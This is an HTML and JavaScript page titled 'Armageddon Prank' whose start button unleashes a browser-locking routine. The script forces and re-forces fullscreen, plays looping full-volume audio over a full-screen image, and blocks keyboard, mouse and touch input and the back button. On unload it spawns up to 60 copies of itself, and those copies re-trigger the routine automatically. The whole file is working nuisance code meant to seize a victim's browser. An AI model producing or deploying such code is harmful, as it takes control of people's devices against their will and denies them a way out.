<!DOCTYPE html>
<html lang="pl">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>Armageddon Prank</title>
  <style>
    body, html {margin:0;padding:0;height:100%;width:100%;background:#000;overflow:hidden;
      touch-action:none;-webkit-touch-callout:none;user-select:none;}
    #start-button {position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);
      padding:50px 100px;font-size:80px;background:linear-gradient(#f00,#900);color:#fff;
      border:none;border-radius:40px;cursor:pointer;box-shadow:0 0 80px #f00;z-index:9999;}
    #start-button:hover {background:linear-gradient(#f00,#c00);transform:translate(-50%,-50%) scale(1.05);}
    #overlay {position:fixed;top:0;left:0;width:100%;height:100%;background:#000;display:none;z-index:9998;}
    #gorilla {position:fixed;top:0;left:0;width:100%;height:100%;object-fit:cover;display:none;z-index:9997;}
  </style>
</head>
<body>

  <button id="start-button">START = KONIEC</button>
  <div id="overlay"></div>
  <img id="gorilla" src="https://share.google/images/RShrwU55O7idxwmqH" alt="no to masz">

  <audio id="prank-audio" loop preload="auto">
    <source src="sound.mp3" type="audio/mpeg">
  </audio>

  <script>
    let isApocalypse = false;
    let openedWindowsCount = 0;
    const MAX_WINDOWS = 60;
    const SPAWN_INTERVAL = 300;
    const FULLSCREEN_CHECK_INTERVAL = 500;

    function enterFullscreen() {
      const e = document.documentElement;
      e.requestFullscreen?.() || e.webkitRequestFullscreen?.(Element.ALLOW_KEYBOARD_INPUT) || 
      e.mozRequestFullScreen?.() || e.msRequestFullscreen?.() || e.webkitEnterFullscreen?.();
    }

    function monitorFullscreen() {
      if (!document.fullscreenElement && !document.mozFullScreenElement && 
          !document.webkitFullscreenElement && !document.msFullscreenElement) enterFullscreen();
    }

    function spawnNewWindow() {
      if (openedWindowsCount >= MAX_WINDOWS) return;
      const w = window.open(location.href,'_blank','width=1024,height=768');
      if (w) { openedWindowsCount++; w.name='apocalypse-window'; }
    }

    function unleashHell() {
      if (isApocalypse) return;
      isApocalypse = true;

      document.getElementById('start-button').remove();
      document.getElementById('overlay').style.display = 'block';
      document.getElementById('gorilla').style.display = 'block';   // ← tu się pojawia małpa

      const audio = document.getElementById('prank-audio');
      audio.volume = 1.0; audio.play().catch(()=>{});

      enterFullscreen();
      setInterval(monitorFullscreen, FULLSCREEN_CHECK_INTERVAL);

      document.addEventListener('fullscreenchange', monitorFullscreen);
      document.addEventListener('mozfullscreenchange', monitorFullscreen);
      document.addEventListener('webkitfullscreenchange', monitorFullscreen);
      document.addEventListener('MSFullscreenChange', monitorFullscreen);

      const block = e => {
        if (e.ctrlKey||e.altKey||e.metaKey||e.shiftKey||e.key==='Escape'||e.key==='F11'||e.key==='F5'||e.key.includes('Tab')||e.key.includes('Arrow')) {
          e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation(); enterFullscreen(); return false;
        }
      };
      ['keydown','keyup','keypress','contextmenu','click','dblclick','mousedown','mouseup','touchstart','touchmove','touchend'].forEach(ev=>
        document.addEventListener(ev, e=>{e.preventDefault();e.stopPropagation();return false;}, true));

      document.body.style.pointerEvents = 'none';
      history.pushState(null,null,location.href);
      window.onpopstate = ()=>{history.pushState(null,null,location.href);enterFullscreen();};

      window.addEventListener('beforeunload',()=>{spawnNewWindow();spawnNewWindow();});
      window.addEventListener('unload',()=>{const i=setInterval(spawnNewWindow,SPAWN_INTERVAL);setTimeout(()=>clearInterval(i),20000);});

      setInterval(()=>{if(openedWindowsCount<MAX_WINDOWS/2)spawnNewWindow();},1000);
    }

    document.getElementById('start-button').addEventListener('click', unleashHell);

    if (window.name.includes('apocalypse-window')) unleashHell();
  </script>
</body>
</html>
